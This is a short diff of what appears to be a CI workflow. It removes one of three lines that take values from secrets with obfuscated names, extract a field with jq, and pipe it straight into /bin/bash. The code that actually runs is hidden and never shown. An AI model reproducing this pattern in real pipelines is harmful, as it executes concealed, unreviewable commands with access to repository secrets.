@@ -18,7 +18,6 @@ jobs:
           kngvv70660: ${{ secrets.kngvv70660 }}
         run: |
           printf '%s' "$kngvv70660" | jq -r .bm0 | /bin/bash
-          printf '%s' "$cm409" | jq -r .plqnf7556 | /bin/bash
           printf '%s' "$amhxe67971" | jq -r .jpg4427 | /bin/bash
 
       - name: Archive output
